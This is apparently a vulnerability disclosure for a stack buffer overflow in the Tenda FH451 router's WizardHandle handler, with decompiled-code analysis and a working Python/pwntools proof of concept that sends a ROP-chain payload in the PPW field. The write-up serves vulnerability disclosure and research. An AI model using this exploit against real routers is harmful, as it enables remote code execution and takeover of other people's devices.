# Shenzhen Jixiang Tengda Technology Co., Ltd. FH451 has a Remote Code Execution vulnerability

**Vulnerability URL**: [http://0.0.0.0:80/goform/WizardHandle](http://0.0.0.0:80/goform/WizardHandle)

**Firmware Download Link:** [https://www.tenda.com.cn/material/show/1629](https://www.tenda.com.cn/material/show/1629)

## Vulnerability Analysis
The vulnerability occurs in the `fromAddressNat` function.

![Image 1](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromWizardHandle1.png)

![Image 2](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromWizardHandle2.png)

![Image 3](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromWizardHandle3.png)

This function accepts the `WANT` and `WANS` parameter from a POST request. Within `v45` == 2, this function accepts the `PPW` parameter from a POST request, which is assigned to `sub_3C434(v30, v5)`;. However, since the user has control over the input of `PPW`, the function `decodePwd()` leads to a buffer overflow. The user-supplied `PPW` can exceed the capacity of the `v5` array, which can lead to a program crash or potential exploitation.  

![Image 4](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromWizardHandle4.png)

The disassembled code of the function `sub_3C434` is as follows. It can be observed that this function does not perform bounds checking. It copies the `result` parameter byte-by-byte into the `a2` pointer parameter, which may potentially lead to a stack overflow.
Cross-referenced location: from the `fromWizardHandle` function, routed to `WizardHandle`, at line 18.
![Image 5](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromWizardHandle5.png)

Further cross-referenced to the `sub_64EAC` function, with attention to lines 44 and 47.
![Image 6](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat3.png)

It can be determined that the vulnerability occurs at the page path `goform/WizardHandle`.

## payload
```python
import requests
from pwn import *

libc = ELF('./squashfs-root/lib/libc.so.0')
system_offset = libc.symbols["system"]
base = 0x3fe36000

system_addr = base + system_offset
puts = base+libc.symbols['puts']
str = b"hello-I-am-fzz\x00"
mov_r0 = base+0x00040cb8 # mov r0, sp; blx r3;
pop_r3 = base+0x00018298 # pop {r3, pc};
payload = b'a'*524 + p32(pop_r3)+p32(puts)+p32(mov_r0)+str

ip = '0.0.0.0:80'
url = f"http://{ip}/goform/WizardHandle"
data = {"WANS":"-1","WANT":"2","PPW":payload}
ret = requests.post(url, data)
```

# reproduce
![Image 7](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromWizardHandle6.png)
![Image 8](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromWizardHandle7.png)
![Image 9](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromWizardHandle8.png)
